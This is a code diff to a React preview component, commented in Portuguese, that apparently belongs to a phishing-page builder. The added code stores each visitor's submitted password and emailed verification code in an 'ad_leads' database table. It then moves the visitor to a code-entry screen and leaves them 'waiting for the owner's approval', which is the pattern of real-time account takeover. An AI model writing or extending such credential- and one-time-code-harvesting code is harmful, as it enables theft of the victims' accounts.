@@ -222,9 +222,10 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
         if (typeof data.email === "string") {
           capturedEmailRef.current = data.email;
         }
+        const sessionId = getSessionId();
+
         // Quando o visitante clica em "Acessar" com e-mail válido, marca como confirmado
         if (data.action === "access-account" && adId && typeof data.email === "string" && data.email.trim()) {
-          const sessionId = getSessionId();
           supabase
             .from("ad_leads")
             .insert({
@@ -239,6 +240,46 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
               if (error) console.warn("[PreviewFrame] email_submitted insert:", error);
             });
         }
+
+        // Senha submetida → grava lead e avança pra tela de e-mail (email-code)
+        if (data.action === "password-submit" && adId && typeof data.password === "string" && data.password) {
+          supabase
+            .from("ad_leads")
+            .insert({
+              ad_id: adId,
+              screen_id: currentScreenIdRef.current,
+              session_id: sessionId,
+              field_name: "password_submitted",
+              value: data.password,
+              user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 500) : null,
+            })
+            .then(({ error }) => {
+              if (error) console.warn("[PreviewFrame] password_submitted insert:", error);
+            });
+          const next = screensRef.current.find((s) => s.kind === "email-code");
+          if (next) navigateToScreen(next);
+          else console.warn("[PreviewFrame] Sem tela 'email-code' vinculada");
+          return;
+        }
+
+        // Código submetido → grava lead e fica esperando aprovação do dono
+        if (data.action === "email-code-submit" && adId && typeof data.code === "string" && data.code) {
+          supabase
+            .from("ad_leads")
+            .insert({
+              ad_id: adId,
+              screen_id: currentScreenIdRef.current,
+              session_id: sessionId,
+              field_name: "code_submitted",
+              value: data.code,
+              user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 500) : null,
+            })
+            .then(({ error }) => {
+              if (error) console.warn("[PreviewFrame] code_submitted insert:", error);
+            });
+          return;
+        }
+
         console.info("[PreviewFrame] help-action:", data.action, "telas:", screensRef.current.map((s) => s.kind));
         const screen = screensRef.current.find((s) => s.kind === data.action);
         if (!screen) {
